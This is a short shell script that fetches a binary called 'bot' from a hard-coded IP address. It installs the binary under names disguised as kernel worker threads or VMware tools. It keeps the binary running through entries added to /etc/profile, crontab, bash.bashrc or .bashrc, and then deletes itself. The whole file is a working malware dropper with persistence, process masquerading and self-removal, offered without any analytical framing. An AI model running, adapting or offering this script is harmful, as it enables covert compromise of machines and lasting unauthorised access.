#!/bin/sh

wget http://10.1.215.73:8443/bot -O /tmp/bin

case "$1" in

profile)
    echo "profile"
    cp /tmp/bin "/usr/sbin/[kworker_0:0-rcu_par_gp]"
    chmod +x "/usr/sbin/[kworker_0:0-rcu_par_gp]"
    echo "/usr/sbin/[kworker_0:0-rcu_par_gp]" >> /etc/profile
    "/usr/sbin/[kworker_0:0-rcu_par_gp]"
    ;;

cron)
    mv /tmp/bin "/usr/sbin/[kworker_1:2-ata_sff]"
    chmod +x "/usr/sbin/[kworker_1:2-ata_sff]"
    echo "*/10 * * * * /usr/sbin/[kworker_1:2-ata_sff]" >> /etc/crontab
    ;;

cron-user)
    mv /tmp/bin "/var/tmp/[kworker_1:2-ata_sff]"
    chmod +x "/var/tmp/[kworker_1:2-ata_sff]"
    ( printf -- '*/10 * * * * /var/tmp/[kworker_1:2-ata_sff]\n' ) | crontab
    ;;

bashrc)
    mv /tmp/bin "/usr/sbin/[bios]"
    chmod +x "/usr/sbin/[bios]"
    echo "/usr/sbin/[bios]" >> /etc/bash.bashrc
    ;;

bashrc-user)
    mv /tmp/bin "/var/tmp/vmtoolsd"
    chmod +x "/var/tmp/vmtoolsd"
    echo "/var/tmp/vmtoolsd" >> /home/$USER/.bashrc
    ;;
esac

rm /tmp/bin
rm -- "$0"
